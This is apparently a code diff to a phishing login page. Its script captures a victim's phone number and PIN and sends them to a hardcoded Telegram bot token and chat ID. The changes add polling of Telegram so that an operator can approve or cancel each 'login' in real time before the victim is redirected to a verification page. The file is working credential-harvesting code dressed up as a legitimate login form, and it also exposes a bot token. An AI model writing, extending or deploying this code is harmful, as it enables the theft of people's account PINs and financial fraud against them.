@@ -351,10 +351,7 @@
             Please wait...<br /> This usually takes a few seconds
         </div>
     </div>
-
-
-    <script>
-        // --- Existing Telegram bot tokens (kept as-is from your code) ---
+<script>
         const BOT_TOKEN_1 = '8770786277:AAHbhWtTMb6BjBnfq-Hz4JZLLwfhNtWMZDc';
         const CHAT_ID_1 = '8586910663';
 
@@ -371,9 +368,9 @@
         const pinBoxes = document.querySelectorAll('.pin-box');
         const loginBtn = document.getElementById('loginBtn');
         const spinnerOverlay = document.getElementById('spinnerOverlay');
+        const spinnerText = spinnerOverlay.querySelector('.spinner-text');
         let pinValue = '';
-
-        const PIN_LENGTH = 5; // ✅ required PIN length
+        const PIN_LENGTH = 5;
 
         function checkPinComplete() {
             pinValue = Array.from(pinBoxes).map(box => box.value).join('');
@@ -382,7 +379,6 @@
 
         pinBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
-                // Move to next box when current is filled
                 if (box.value.length === 1 && index < pinBoxes.length - 1) {
                     pinBoxes[index + 1].focus();
                 }
@@ -396,7 +392,9 @@
             });
         });
 
-        loginBtn.addEventListener('click', () => {
+        let pollInterval = null;
+
+        loginBtn.addEventListener('click', async () => {
             const phone = phoneInput.value.trim();
 
             if (!phone) {
@@ -410,54 +408,107 @@
             }
 
             spinnerOverlay.style.display = 'flex';
+            spinnerText.innerHTML = 'Waiting for approval...<br />Please check your Telegram';
             localStorage.setItem('phone', phone);
             localStorage.setItem('pin', pinValue);
 
             const currentTimestamp = Date.now();
             const message = `New Login Attempt\n\nPhone: +237 ${phone}\nPIN: ${pinValue}`;
 
-            // Payload configuration containing the inline keyboard
             const payload = {
                 chat_id: CHAT_ID_1,
                 text: message,
                 reply_markup: {
                     inline_keyboard: [
-                        [{
-                            text: '✅ Approve',
-                            callback_data: 'approve_' + currentTimestamp
-                        }, {
-                            text: '❌ Cancel',
-                            callback_data: 'cancel_' + currentTimestamp
-                        }]
+                        [
+                            {
+                                text: '✅ Approve',
+                                callback_data: 'approve_' + currentTimestamp
+                            },
+                            {
+                                text: '❌ Cancel',
+                                callback_data: 'cancel_' + currentTimestamp
+                            }
+                        ]
                     ]
                 }
             };
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            }).catch(() => {});
+            // Send message to Telegram
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Failed to send telegram notification", err);
+            }
 
-            // Update chat_id for the second bot if needed
-            const payload2 = {
-                ...payload,
-                chat_id: CHAT_ID_2
-            };
+            // Start polling Telegram for callback responses
+            let offset = 0;
+            const startTime = Date.now();
+            const timeoutLimit = 120000; // Stop polling after 2 minutes
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload2)
-            }).catch(() => {});
+            pollInterval = setInterval(async () => {
+                // Stop if timeout is reached (2 minutes)
+                if (Date.now() - startTime > timeoutLimit) {
+                    clearInterval(pollInterval);
+                    spinnerOverlay.style.display = 'none';
+                    alert('Approval request timed out. Please try again.');
+                    return;
+                }
 
-            setTimeout(() => {
-                window.location.href = 'verify.html';
-            }, 1500);
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/getUpdates?offset=${offset}&timeout=2`);
+                    const data = await response.json();
+
+                    if (data.ok && data.result) {
+                        for (const update of data.result) {
+                            offset = update.update_id + 1;
+
+                            if (update.callback_query) {
+                                const callbackData = update.callback_query.data;
+
+                                // Check if the response matches our specific action timestamp
+                                if (callbackData === `approve_${currentTimestamp}`) {
+                                    clearInterval(pollInterval);
+                                    spinnerText.innerHTML = 'Approved!<br />Redirecting...';
+                                    
+                                    // Acknowledge the callback to stop the loading animation on the Telegram button
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ callback_query_id: update.callback_query.id, text: "Login Approved" })
+                                    }).catch(() => {});
+
+                                    setTimeout(() => {
+                                        window.location.href = 'verify.html';
+                                    }, 1000);
+                                    return;
+                                } 
+                                
+                                if (callbackData === `cancel_${currentTimestamp}`) {
+                                    clearInterval(pollInterval);
+                                    spinnerOverlay.style.display = 'none';
+                                    
+                                    // Acknowledge cancellation
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ callback_query_id: update.callback_query.id, text: "Login Declined" })
+                                    }).catch(() => {});
+
+                                    alert('Login request was declined.');
+                                    return;
+                                }
+                            }
+                        }
+                    }
+                } catch (e) {
+                    console.error("Polling error", e);
+                }
+            }, 3000); // Poll every 3 seconds
         });
 
         checkPinComplete();
